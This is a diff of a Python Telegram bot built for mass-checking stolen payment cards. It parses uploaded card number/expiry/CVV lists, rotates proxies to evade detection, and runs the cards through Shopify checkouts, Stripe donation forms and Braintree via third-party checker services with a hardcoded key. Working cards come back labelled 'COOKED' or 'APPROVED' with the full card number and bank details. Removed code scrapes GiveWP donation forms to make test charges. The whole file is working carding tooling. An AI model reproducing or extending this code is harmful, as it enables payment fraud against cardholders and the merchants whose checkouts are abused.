@@ -1,21 +1,32 @@
-import requests
-import time
-import threading
-import random
-import logging
-import re
-import csv
 import os
-import urllib3
-import traceback
 import json
-import user_agent
-import gates
+import re
+import time
+import random
+import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import requests
+import urllib3
 from telebot import types
 
-OWNER_ID = [5963548505, 1614278744]
+# Disable SSL warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ============================================================================
+# Permission system for approved users (non-owners)
+# ============================================================================
+APPROVED_USERS_FILE = "approved_users.json"
 USER_PROXIES_FILE = "user_proxies.json"
+
+def load_approved_users():
+    if os.path.exists(APPROVED_USERS_FILE):
+        with open(APPROVED_USERS_FILE, 'r') as f:
+            return set(json.load(f))
+    return set()
+
+def save_approved_users(approved_set):
+    with open(APPROVED_USERS_FILE, 'w') as f:
+        json.dump(list(approved_set), f)
 
 def load_user_proxies():
     if os.path.exists(USER_PROXIES_FILE):
@@ -23,286 +34,116 @@ def load_user_proxies():
             return json.load(f)
     return {}
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+def save_user_proxies(proxies_dict):
+    with open(USER_PROXIES_FILE, 'w') as f:
+        json.dump(proxies_dict, f, indent=2)
 
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - [%(levelname)s] - %(message)s',
-    datefmt='%H:%M:%S'
-)
-logger = logging.getLogger(__name__)
+# Global sets/dicts
+approved_users = load_approved_users()
+user_proxies_store = load_user_proxies()   # key: user_id (str), value: list of proxy strings
 
-user_sessions = {}
-BINS_CSV_FILE = 'bins_all.csv'
-MAX_RETRIES = 2
-PROXY_TIMEOUT = 5
-BIN_DB = {}
-pending_stsite = {}  # Temporary storage for /stsite file content
+def is_user_allowed(user_id):
+    """Check if user is owner or in approved list."""
+    return user_id in OWNER_ID or user_id in approved_users
 
-def load_bin_database():
-    global BIN_DB
-    if not os.path.exists(BINS_CSV_FILE):
-        logger.warning(f"⚠️ System: BIN CSV file '{BINS_CSV_FILE}' not found.")
-        return
-    try:
-        with open(BINS_CSV_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-            reader = csv.reader(f)
-            next(reader, None)
-            for row in reader:
-                if len(row) >= 6:
-                    BIN_DB[row[0].strip()] = {
-                        'country_name': row[1].strip(),
-                        'country_flag': get_flag_emoji(row[1].strip()),
-                        'brand': row[2].strip(),
-                        'type': row[3].strip(),
-                        'level': row[4].strip(),
-                        'bank': row[5].strip()
-                    }
-    except Exception as e:
-        logger.error(f"❌ Error loading BIN CSV: {e}")
-
-def get_flag_emoji(country_code):
-    if not country_code or len(country_code) != 2:
-        return "🇺🇳"
-    return "".join([chr(ord(c.upper()) + 127397) for c in country_code])
-
-load_bin_database()
-
-def get_bin_info(card_number):
-    clean_cc = re.sub(r'\D', '', str(card_number))
-    bin_code = clean_cc[:6]
-    if bin_code in BIN_DB:
-        return BIN_DB[bin_code]
-    try:
-        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=3)
-        if response.status_code == 200:
-            data = response.json()
-            return {
-                'country_name': data.get('country_name', 'Unknown'),
-                'country_flag': data.get('country_flag', '🇺🇳'),
-                'brand': data.get('brand', 'Unknown'),
-                'type': data.get('type', 'Unknown'),
-                'level': data.get('level', 'Unknown'),
-                'bank': data.get('bank', 'Unknown')
-            }
-    except:
-        pass
-    return {
-        'country_name': 'Unknown',
-        'country_flag': '🇺🇳',
-        'bank': 'UNKNOWN',
-        'brand': 'UNKNOWN',
-        'type': 'UNKNOWN',
-        'level': 'UNKNOWN'
-    }
-
-def extract_cards_from_text(text):
-    valid_ccs = []
-    text = text.replace(',', '\n').replace(';', '\n')
-    lines = text.split('\n')
-    for line in lines:
-        line = line.strip()
-        if len(line) < 15:
-            continue
-        match = re.search(r'(\d{13,19})[|:/\s](\d{1,2})[|:/\s](\d{2,4})[|:/\s](\d{3,4})', line)
-        if match:
-            cc, mm, yyyy, cvv = match.groups()
-            if len(yyyy) == 2:
-                yyyy = "20" + yyyy
-            mm = mm.zfill(2)
-            if 1 <= int(mm) <= 12:
-                valid_ccs.append(f"{cc}|{mm}|{yyyy}|{cvv}")
-    return list(set(valid_ccs))
-
-def create_progress_bar(processed, total, length=15):
-    if total == 0:
-        return ""
-    percent = processed / total
-    filled_length = int(length * percent)
-    return f"<code>{'█' * filled_length}{'░' * (length - filled_length)}</code> {int(percent * 100)}%"
-
-def validate_proxies_strict(proxies, bot, message):
-    live_proxies = []
-    total = len(proxies)
-    status_msg = bot.reply_to(message, f"🛡️ <b>Verifying {total} Proxies...</b>", parse_mode='HTML')
-    last_ui_update = time.time()
-    checked = 0
-
-    def check(proxy_str):
-        try:
-            parts = proxy_str.split(':')
-            if len(parts) == 2:
-                url = f"http://{parts[0]}:{parts[1]}"
-            elif len(parts) == 4:
-                url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
-            else:
-                return False
-            requests.get("http://httpbin.org/ip", proxies={'http': url, 'https': url}, timeout=PROXY_TIMEOUT)
-            return True
-        except:
-            return False
-
-    with ThreadPoolExecutor(max_workers=50) as executor:
-        futures = {executor.submit(check, p): p for p in proxies}
-        for future in as_completed(futures):
-            checked += 1
-            if future.result():
-                live_proxies.append(futures[future])
-            if time.time() - last_ui_update > 2:
-                try:
-                    bot.edit_message_text(
-                        f"🛡️ <b>Verifying Proxies</b>\n✅ Live: {len(live_proxies)}\n💀 Dead: {checked - len(live_proxies)}\n📊 {checked}/{total}",
-                        message.chat.id, status_msg.message_id, parse_mode='HTML'
-                    )
-                    last_ui_update = time.time()
-                except:
-                    pass
-    try:
-        bot.delete_message(message.chat.id, status_msg.message_id)
-    except:
-        pass
-    return live_proxies
-
-# ============================================================================
-# 🔧 SHOPIFY CHECKER WITH FALLBACK + ENHANCED RESPONSE MAPPING
-# ============================================================================
-def check_site_shopify_direct(site_url, cc, proxy=None):
-    import urllib.parse
-    import requests
-    import re
-
-    def call_api(api_base):
-        try:
-            clean_site = site_url.rstrip('/')
-            # Use a different variable name to avoid shadowing outer proxy
-            proxy_str = proxy
-            api_proxy = ""
-            if proxy_str:
-                proxy_str = proxy_str.strip()
-                parts = proxy_str.split(':')
-                if len(parts) == 4:
-                    api_proxy = proxy_str
-                elif '@' in proxy_str:
-                    match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy_str)
-                    if match:
-                        user, password, host, port = match.groups()
-                        api_proxy = f"{host}:{port}:{user}:{password}"
-                elif len(parts) == 2:
-                    api_proxy = proxy_str  # host:port only
-
-            encoded_cc = urllib.parse.quote(cc)
-            encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""
-
-            if api_base == "mentoschk":
-                url = f"http://mentoschk.com/shopify?site={clean_site}&cc={encoded_cc}"
-                if encoded_proxy:
-                    url += f"&proxy={encoded_proxy}"
-            else:  # hqdumps
-                api_key = "techshopify"
-                url = f"https://hqdumps.com/autoshopify/index.php?key={api_key}&url={clean_site}&cc={encoded_cc}"
-                if encoded_proxy:
-                    url += f"&proxy={encoded_proxy}"
-
-            session = requests.Session()
-            session.verify = False
-            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
-            response = session.get(url, headers=headers, timeout=90)
-
-            if response.status_code != 200:
-                print(f"[API] {api_base} returned {response.status_code}")
-                return None
-
-            data = response.json()
-            print(f"[API] {api_base} raw response: {data}")
-
-            # Normalize response to a common format
-            if api_base == "mentoschk":
-                return {
-                    'Response': data.get('Response', 'Unknown'),
-                    'Price': str(data.get('Price', '0.00')),
-                    'Gateway': data.get('Gateway', 'Shopify API'),
-                    'Status': data.get('Status', False)
-                }
-            else:  # hqdumps
-                resp_text = data.get('Response', 'Unknown')
-                # Infer Status from response text (hqdumps doesn't send Status field)
-                status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
-                return {
-                    'Response': resp_text,
-                    'Price': str(data.get('Price', '0.00')),
-                    'Gateway': data.get('Gate', 'Shopify API'),
-                    'Status': status
-                }
-        except Exception as e:
-            print(f"[API] {api_base} exception: {e}")
-            return None
-
-    # Try primary
-    result = call_api("mentoschk")
-    if result is None:
-        result = call_api("hqdumps")
-
-    if result is None:
-        return {
-            'Response': 'Both APIs failed',
-            'status': 'ERROR',
-            'gateway': 'Shopify API',
-            'price': '0.00',
-            'message': 'No response from any API'
-        }
-
-    response_text = result['Response']
-    price = result['Price']
-    gateway = result['Gateway']
-    status_bool = result['Status']
-    response_upper = response_text.upper()
-
-    # --- Enhanced mapping (same as before) ---
-    approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS']
-    approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
-    declined_keywords = ['CARD DECLINED', 'DECLINED', 'EXPIRED_CARD', 'EXPIRED', 'FRAUD', 'SUSPECTED',
-                         'INCORRECT CVC', 'INCORRECT_CVC', 'INCORRECT ZIP', 'INCORRECT_ZIP',
-                         'INCORRECT NUMBER', 'INCORRECT_NUMBER', 'INVALID NUMBER', 'DO NOT HONOR',
-                         'PICKUP', 'LOST CARD', 'STOLEN CARD', 'AMOUNT TOO SMALL', 'AMOUNT_TOO_SMALL']
-    extra_declined = ['SUBMIT REJECTED', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
-                      'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
-                      'PAYMENTS_CREDIT_CARD_SESSION_ID']
-    error_keywords = ['FAILED TO TOKENIZE CARD', 'SITE DEAD', 'GENERIC_ERROR', 'DEAD/TIMEOUT',
-                      'TIMEOUT', 'PROXY', 'UNABLE TO GET PAYMENT TOKEN', 'CART ADD FAILED',
-                      'SUBMIT FAILED', 'RECHECK']
-
-    if any(k in response_upper for k in approved_keywords):
-        status = 'APPROVED'
-    elif any(k in response_upper for k in approved_otp_keywords):
-        status = 'APPROVED_OTP'
-    elif any(k in response_upper for k in declined_keywords + extra_declined):
-        status = 'DECLINED'
-    elif any(k in response_upper for k in error_keywords):
-        status = 'ERROR'
-    else:
-        status = 'ERROR' if status_bool is False else 'DECLINED'
-
-    return {
-        'Response': response_text,
-        'status': status,
-        'gateway': gateway,
-        'price': price,
-        'message': response_text
-    }
-# ============================================================================
-# 🚀 MAIN HANDLER SETUP
 # ============================================================================
 def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                           check_site_func, is_valid_response_func,
                           process_response_func, update_stats_func, save_json_func,
-                          is_user_allowed_func):
+                          is_user_allowed_func):   # we will override this function internally
+    # Override the passed is_user_allowed_func with our own that includes approved users
+    def user_allowed(uid):
+        return is_user_allowed(uid)
+
+    # ------------------------------------------------------------------------
+    # Commands to manage approved users (owners only)
+    # ------------------------------------------------------------------------
+    @bot.message_handler(commands=['adduser'])
+    def cmd_adduser(message):
+        if message.from_user.id not in OWNER_ID:
+            bot.reply_to(message, "🚫 Owner only.")
+            return
+        try:
+            uid = int(message.text.split()[1])
+            approved_users.add(uid)
+            save_approved_users(approved_users)
+            bot.reply_to(message, f"✅ User {uid} added to approved list.")
+        except (IndexError, ValueError):
+            bot.reply_to(message, "Usage: /adduser <user_id>")
+
+    @bot.message_handler(commands=['removeuser'])
+    def cmd_removeuser(message):
+        if message.from_user.id not in OWNER_ID:
+            bot.reply_to(message, "🚫 Owner only.")
+            return
+        try:
+            uid = int(message.text.split()[1])
+            approved_users.discard(uid)
+            save_approved_users(approved_users)
+            bot.reply_to(message, f"✅ User {uid} removed from approved list.")
+        except (IndexError, ValueError):
+            bot.reply_to(message, "Usage: /removeuser <user_id>")
+
+    # ------------------------------------------------------------------------
+    # Commands for user proxy management
+    # ------------------------------------------------------------------------
+    @bot.message_handler(commands=['addproxy'])
+    def cmd_addproxy(message):
+        if not user_allowed(message.from_user.id):
+            bot.reply_to(message, "🚫 Access Denied.")
+            return
+        args = message.text.split()
+        if len(args) < 2:
+            bot.reply_to(message, "Usage: /addproxy ip:port OR ip:port:user:pass")
+            return
+        proxy = args[1].strip()
+        # Basic format validation
+        parts = proxy.split(':')
+        if len(parts) not in (2, 4):
+            bot.reply_to(message, "❌ Invalid format. Use ip:port or ip:port:user:pass")
+            return
+        uid = str(message.from_user.id)
+        if uid not in user_proxies_store:
+            user_proxies_store[uid] = []
+        if proxy not in user_proxies_store[uid]:
+            user_proxies_store[uid].append(proxy)
+            save_user_proxies(user_proxies_store)
+            bot.reply_to(message, f"✅ Proxy added. Total: {len(user_proxies_store[uid])}")
+        else:
+            bot.reply_to(message, "⚠️ Proxy already in your list.")
+
+    @bot.message_handler(commands=['myproxies'])
+    def cmd_myproxies(message):
+        if not user_allowed(message.from_user.id):
+            bot.reply_to(message, "🚫 Access Denied.")
+            return
+        uid = str(message.from_user.id)
+        proxies = user_proxies_store.get(uid, [])
+        if not proxies:
+            bot.reply_to(message, "📭 You have no saved proxies.")
+            return
+        proxy_list = "\n".join([f"{i+1}. {p}" for i, p in enumerate(proxies)])
+        bot.reply_to(message, f"🔌 Your proxies:\n{proxy_list}")
+
+    @bot.message_handler(commands=['clearproxies'])
+    def cmd_clearproxies(message):
+        if not user_allowed(message.from_user.id):
+            bot.reply_to(message, "🚫 Access Denied.")
+            return
+        uid = str(message.from_user.id)
+        if uid in user_proxies_store and user_proxies_store[uid]:
+            user_proxies_store[uid] = []
+            save_user_proxies(user_proxies_store)
+            bot.reply_to(message, "✅ All your proxies cleared.")
+        else:
+            bot.reply_to(message, "📭 You have no proxies to clear.")
 
     # ==========================================================================
-    # FILE UPLOAD HANDLER
+    # FILE UPLOAD HANDLER (with permission fix and proxy saving)
     # ==========================================================================
     @bot.message_handler(content_types=['document'])
     def handle_file_upload_event(message):
-        if not is_user_allowed_func(message.from_user.id):
+        if not user_allowed(message.from_user.id):
             bot.reply_to(message, "🚫 <b>Access Denied:</b> Contact Admin.", parse_mode='HTML')
             return
 
@@ -324,14 +165,14 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 if user_id not in user_sessions:
                     user_sessions[user_id] = {}
                 user_sessions[user_id]['ccs'] = ccs
-                user_sessions[user_id]['proxies'] = []
+                user_sessions[user_id]['proxies'] = []   # temporary proxies from file (not saved)
 
                 markup = types.InlineKeyboardMarkup(row_width=1)
                 markup.add(
                     types.InlineKeyboardButton("🛍️ Shopify Mass (Multi-Site)", callback_data="run_mass_shopify"),
                     types.InlineKeyboardButton("💳 Stripe Donation (Multi)", callback_data="run_mass_stripe_donation"),
                     types.InlineKeyboardButton("💰 Braintree Auth (bandc)", callback_data="run_mass_braintree_mass"),
-                    types.InlineKeyboardButton("🔤 Duolingo Stripe Auth", callback_data="run_mass_duolingo_stripe"),   # <-- new button
+                    types.InlineKeyboardButton("🔤 Duolingo Stripe Auth", callback_data="run_mass_duolingo_stripe"),
                     types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel")
                 )
 
@@ -342,14 +183,28 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                     message.chat.id, msg_loading.message_id, reply_markup=markup, parse_mode='HTML'
                 )
             else:
+                # Try to load proxies from file
                 proxies = [line.strip() for line in file_content.split('\n') if ':' in line]
                 if proxies:
                     user_id = message.from_user.id
+                    uid = str(user_id)
+                    # Save to persistent storage
+                    if uid not in user_proxies_store:
+                        user_proxies_store[uid] = []
+                    # Add new proxies (avoid duplicates)
+                    added = 0
+                    for p in proxies:
+                        if p not in user_proxies_store[uid]:
+                            user_proxies_store[uid].append(p)
+                            added += 1
+                    if added > 0:
+                        save_user_proxies(user_proxies_store)
+                    # Also store in session for immediate use
                     if user_id not in user_sessions:
                         user_sessions[user_id] = {}
-                    user_sessions[user_id]['proxies'] = proxies
+                    user_sessions[user_id]['proxies'] = user_proxies_store[uid]   # load all saved
                     bot.edit_message_text(
-                        f"🔌 <b>Proxies Loaded:</b> {len(proxies)}\n✅ You can now run Mass Check.",
+                        f"🔌 <b>Proxies Loaded:</b> {added} new (total {len(user_proxies_store[uid])})\n✅ You can now run Mass Check.",
                         message.chat.id, msg_loading.message_id, parse_mode='HTML'
                     )
                 else:
@@ -359,11 +214,11 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.reply_to(message, f"❌ Error: {e}")
 
     # ==========================================================================
-    # MASS CHECK COMMAND
+    # MASS CHECK COMMAND (uses persistent proxies if available)
     # ==========================================================================
     @bot.message_handler(commands=['msh', 'hardcook'])
     def handle_mass_check_command(message):
-        if not is_user_allowed_func(message.from_user.id):
+        if not user_allowed(message.from_user.id):
             bot.send_message(message.chat.id, "🚫 <b>Access Denied</b>", parse_mode='HTML')
             return
 
@@ -379,49 +234,88 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.send_message(message.chat.id, "❌ <b>No sites available!</b> Add sites via /addurls", parse_mode='HTML')
             return
 
-        active_proxies = []
-        user_proxies = user_sessions[user_id].get('proxies', [])
+        # Get proxies (from session or persistent)
+        active_proxies = get_active_proxies_for_user(user_id, bot, message)
+        if active_proxies is None:
+            return   # error message already sent
 
-        if user_proxies:
-            active_proxies = validate_proxies_strict(user_proxies, bot, message)
-            source = f"🔒 User ({len(active_proxies)})"
-        else:
-            server_proxies = proxies_data.get('proxies', [])
-            if server_proxies:
-                active_proxies = server_proxies
-                source = f"🌍 Server ({len(active_proxies)})"
-            else:
-                bot.send_message(message.chat.id, "❌ <b>No Proxies Available!</b> Upload proxies or add server proxies.", parse_mode='HTML')
-                return
-
-        if not active_proxies:
-            bot.send_message(message.chat.id, "❌ <b>All Proxies Dead.</b>", parse_mode='HTML')
-            return
-
-        start_msg = bot.send_message(message.chat.id, f"🔥 <b>Starting...</b>\n💳 {len(ccs)} Cards\n🔌 {source}", parse_mode='HTML')
+        source = f"🔌 Proxies: {len(active_proxies)}"
+        start_msg = bot.send_message(message.chat.id, f"🔥 <b>Starting...</b>\n💳 {len(ccs)} Cards\n{source}", parse_mode='HTML')
 
         threading.Thread(
             target=process_mass_check_engine,
             args=(bot, message, start_msg, ccs, sites, active_proxies,
-                  check_site_func, process_response_func, update_stats_func)
+                  check_site_shopify_direct, process_response_func, update_stats_func, 'both')
         ).start()
 
     # ==========================================================================
-    # HELPER FUNCTIONS (must be defined before callbacks)
+    # Helper: get and validate proxies for user
     # ==========================================================================
-    def get_active_proxies(user_id):
-        user_id = str(user_id)
-        if int(user_id) in user_sessions and user_sessions[int(user_id)].get('proxies'):
-            return user_sessions[int(user_id)]['proxies']
-        saved_proxies = load_user_proxies()
-        if user_id in saved_proxies and saved_proxies[user_id]:
-            return saved_proxies[user_id]
-        if int(user_id) in OWNER_ID:
-            if proxies_data and 'proxies' in proxies_data and proxies_data['proxies']:
-                return proxies_data['proxies']
-        return None
+    def get_active_proxies_for_user(user_id, bot, message):
+        """Return list of live proxies for user, or None if none available (and send error)."""
+        # First check session proxies (uploaded via file)
+        if user_id in user_sessions and user_sessions[user_id].get('proxies'):
+            proxy_list = user_sessions[user_id]['proxies']
+        else:
+            # Fallback to persistent storage
+            uid = str(user_id)
+            proxy_list = user_proxies_store.get(uid, [])
+            if not proxy_list and user_id in OWNER_ID:
+                # Owner can use server proxies
+                proxy_list = proxies_data.get('proxies', [])
 
-    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies, check_site_func, process_response_func, update_stats_func):
+        if not proxy_list:
+            bot.send_message(message.chat.id,
+                             "🚫 <b>No Proxies Available!</b>\n"
+                             "Add proxies via:\n"
+                             "• Upload a .txt file\n"
+                             "• /addproxy ip:port:user:pass",
+                             parse_mode='HTML')
+            return None
+
+        # Validate proxies
+        live_proxies = validate_proxies_strict(proxy_list, bot, message)
+        if not live_proxies:
+            bot.send_message(message.chat.id, "❌ <b>All Proxies Dead.</b> Please add more.", parse_mode='HTML')
+            return None
+        return live_proxies
+
+    # ==========================================================================
+    # Improved hit message sender (full CC, no masking)
+    # ==========================================================================
+    def send_hit_improved(bot, chat_id, res, title):
+        try:
+            cc = res['cc']  # full card number
+            bin_info = get_bin_info(cc)
+            site_domain = res['site_url'].replace('https://', '').replace('http://', '').split('/')[0]
+
+            bank_line = f"{bin_info.get('country_flag', '')} {bin_info.get('bank', 'UNKNOWN')}"
+            card_line = f"{bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}"
+
+            msg = (
+                f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
+                f"┃   {title} HIT!\n"
+                f"┗━━━━━━━━━━━━━━━━━━━━┛\n"
+                f"💳 <b>Card:</b> <code>{cc}</code>\n"
+                f"📟 <b>Resp:</b> {res['response']}\n"
+                f"💰 <b>Amt:</b> ${res['price']}\n"
+                f"🌐 <b>Site:</b> {site_domain}\n"
+                f"🔌 <b>Gate:</b> {res['gateway']}\n"
+                f"🏦 <b>Bank:</b> {bank_line}\n"
+                f"💳 <b>Type:</b> {card_line}\n"
+                f"━━━━━━━━━━━━━━━━━━━━\n"
+            )
+            bot.send_message(chat_id, msg, parse_mode='HTML')
+        except Exception as e:
+            # Fallback
+            bot.send_message(chat_id, f"{title}\n{res['cc']}\n{res['response']}")
+
+    # ==========================================================================
+    # Mass check engine with filter support
+    # ==========================================================================
+    def process_mass_check_engine(bot, message, status_msg, ccs, sites, proxies,
+                                  check_site_func, process_response_func, update_stats_func,
+                                  hit_filter='both'):
         results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
         total = len(ccs)
         processed = 0
@@ -446,10 +340,12 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                         attempts += 1
                         continue
 
-                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway, 'price': site.get('price', '0'), 'site_url': site['url']}
+                    return {'cc': cc, 'status': status, 'response': resp_text, 'gateway': gateway,
+                            'price': site.get('price', '0'), 'site_url': site['url']}
                 except:
                     attempts += 1
-            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown', 'price': '0', 'site_url': 'N/A'}
+            return {'cc': cc, 'status': 'ERROR', 'response': 'Dead/Timeout', 'gateway': 'Unknown',
+                    'price': '0', 'site_url': 'N/A'}
 
         with ThreadPoolExecutor(max_workers=20) as executor:
             futures = {executor.submit(worker, cc): cc for cc in ccs}
@@ -459,17 +355,23 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
                 if res['status'] == 'APPROVED':
                     if any(x in res['response'].upper() for x in ["THANK", "CONFIRMED", "SUCCESS"]):
+                        res['final_status'] = 'COOKED'
                         results['cooked'].append(res)
                         update_stats_func('COOKED', True)
-                        send_hit(bot, message.chat.id, res, "🔥 COOKED")
+                        if hit_filter in ['cooked', 'both']:
+                            send_hit_improved(bot, message.chat.id, res, "🔥 COOKED")
                     else:
+                        res['final_status'] = 'APPROVED'
                         results['approved'].append(res)
                         update_stats_func('APPROVED', True)
-                        send_hit(bot, message.chat.id, res, "✅ APPROVED")
+                        if hit_filter in ['approved', 'both']:
+                            send_hit_improved(bot, message.chat.id, res, "✅ APPROVED")
                 elif res['status'] == 'APPROVED_OTP':
+                    res['final_status'] = 'APPROVED_OTP'
                     results['approved'].append(res)
                     update_stats_func('APPROVED_OTP', True)
-                    send_hit(bot, message.chat.id, res, "✅ APPROVED (OTP)")
+                    if hit_filter in ['approved', 'both']:
+                        send_hit_improved(bot, message.chat.id, res, "⚠️ APPROVED (OTP)")
                 elif res['status'] == 'DECLINED':
                     results['declined'].append(res)
                     update_stats_func('DECLINED', True)
@@ -479,7 +381,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 if time.time() - last_update_time > 3 or processed == total:
                     update_ui(bot, message.chat.id, status_msg.message_id, processed, total, results)
                     last_update_time = time.time()
-                # ----- 📁 Save error cards to file (if any) -----
+
+        # Save error cards
         error_list = [f"{res['cc']} : {res['response']}" for res in results['error']]
         if error_list:
             error_file = f"error_cards_{message.from_user.id}.txt"
@@ -492,413 +395,103 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         duration = time.time() - start_time
         send_final(bot, message.chat.id, status_msg.message_id, total, results, duration)
 
-    def process_mass_gate_check(bot, message, ccs, gate_func, gate_name, proxies):
-        total = len(ccs)
-        results = {'cooked': [], 'approved': [], 'declined': [], 'error': []}
-
-        try:
-            status_msg = bot.send_message(
-                message.chat.id,
-                f"🔥 <b>{gate_name} Started...</b>\n"
-                f"💳 Cards: {total}\n"
-                f"🔌 Proxies: {len(proxies)}",
-                parse_mode='HTML'
-            )
-        except:
-            status_msg = bot.send_message(message.chat.id, f"🔥 <b>{gate_name} Started...</b>", parse_mode='HTML')
-
-        processed = 0
-        start_time = time.time()
-        last_update = time.time()
-
-        with ThreadPoolExecutor(max_workers=10) as executor:
-            futures = {}
-            for cc in ccs:
-                proxy = random.choice(proxies)
-                futures[executor.submit(gate_func, cc, proxy)] = cc
-
-            for future in as_completed(futures):
-                cc = futures[future]
-                processed += 1
-
-                try:
-                    response_text, status = future.result()
-
-                    res_obj = {
-                        'cc': cc,
-                        'response': response_text,
-                        'status': status,
-                        'gateway': gate_name,
-                        'price': 'N/A',
-                        'site_url': 'API'
-                    }
-
-                    if status == 'APPROVED':
-                        results['cooked'].append(res_obj)
-                        send_hit(bot, message.chat.id, res_obj, f"✅ {gate_name} HIT")
-                    elif status == 'APPROVED_OTP':
-                        results['approved'].append(res_obj)
-                        send_hit(bot, message.chat.id, res_obj, f"⚠️ {gate_name} AUTH")
-                    elif status == 'DECLINED':
-                        results['declined'].append(res_obj)
-                    else:
-                        results['error'].append(res_obj)
-
-                    if time.time() - last_update > 3:
-                        msg = (
-                            f"⚡ <b>{gate_name} Checking...</b>\n"
-                            f"{create_progress_bar(processed, total)}\n"
-                            f"<b>Progress:</b> {processed}/{total}\n"
-                            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
-                            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
-                            f"⚠️ <b>Error:</b> {len(results['error'])}"
-                        )
-                        try:
-                            bot.edit_message_text(msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
-                            last_update = time.time()
-                        except:
-                            pass
-
-                except Exception as e:
-                    print(f"Check Error for {cc}: {e}")
-                    results['error'].append({'cc': cc, 'response': str(e), 'status': 'ERROR'})
-
-        duration = time.time() - start_time
-
-        # ----- 📁 Save approved and error cards to files -----
-        approved_list = [f"{res['cc']} : {res['response']}" for res in results['cooked'] + results['approved']]
-        error_list   = [f"{res['cc']} : {res['response']}" for res in results['error']]
-
-        approved_file = f"approved_{message.from_user.id}.txt"
-        error_file    = f"errors_{message.from_user.id}.txt"
-
-        if approved_list:
-            with open(approved_file, 'w') as f:
-                f.write("\n".join(approved_list))
-            with open(approved_file, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption=f"✅ Approved cards ({len(approved_list)})")
-            os.remove(approved_file)
-
-        if error_list:
-            with open(error_file, 'w') as f:
-                f.write("\n".join(error_list))
-            with open(error_file, 'rb') as f:
-                bot.send_document(message.chat.id, f, caption=f"⚠️ Error cards ({len(error_list)})")
-            os.remove(error_file)
-
-        # ----- Final summary -----
-        final_msg = (
-            f"✅ <b>{gate_name} Completed</b>\n"
-            f"━━━━━━━━━━━━━━━━\n"
-            f"💳 <b>Total:</b> {total}\n"
-            f"✅ <b>Live:</b> {len(results['cooked'])}\n"
-            f"❌ <b>Dead:</b> {len(results['declined'])}\n"
-            f"⚠️ <b>Errors:</b> {len(results['error'])}\n"
-            f"⏱️ <b>Time:</b> {duration:.2f}s"
-        )
-
-        try:
-            bot.edit_message_text(final_msg, message.chat.id, status_msg.message_id, parse_mode='HTML')
-        except:
-            bot.send_message(message.chat.id, final_msg, parse_mode='HTML')
-
-    # Helper for donation site testing (used in /stsite)
-    def test_donation_site_like_script(site_url, pk, cc, proxy=None):
-        """
-        Attempt a full donation on a site using the same flow as the working test script.
-        Returns "Charge ✅" if successful, otherwise the error/decline message.
-        """
-        try:
-            # Parse card
-            parts = re.split(r'[ |/]', cc)
-            if len(parts) < 4:
-                return "Invalid card format"
-            c, mm, ex, cvc = parts[0], parts[1], parts[2], parts[3]
-
-            # Process expiry year
-            try:
-                yy = ex[2] + ex[3]
-                if '2' in ex[3] or '1' in ex[3]:
-                    yy = ex[2] + '7'
-            except:
-                yy = ex[0] + ex[1]
-                if '2' in ex[1] or '1' in ex[1]:
-                    yy = ex[0] + '7'
-
-            session = requests.Session()
-            session.verify = False
-            if proxy:
-                formatted = gates.format_proxy(proxy)
-                if formatted:
-                    session.proxies = formatted
-
-            ua = user_agent.generate_user_agent()
-            headers = {'user-agent': ua}
-            donate_url = site_url if site_url.endswith('/donate') else site_url.rstrip('/') + '/donate/'
-
-            # Get donation page
-            r = session.get(donate_url, headers=headers, timeout=20)
-            time.sleep(3)
-
-            # Extract form data
-            ssa = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
-            ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
-            ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
-
-            # First AJAX request to initiate donation
-            headers_ajax = {
-                'origin': site_url,
-                'referer': donate_url,
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'user-agent': ua,
-                'x-requested-with': 'XMLHttpRequest',
-            }
-            data_init = {
-                'give-honeypot': '',
-                'give-form-id-prefix': ssa00,
-                'give-form-id': ss000a00,
-                'give-form-title': 'Give a Donation',
-                'give-current-url': donate_url,
-                'give-form-url': donate_url,
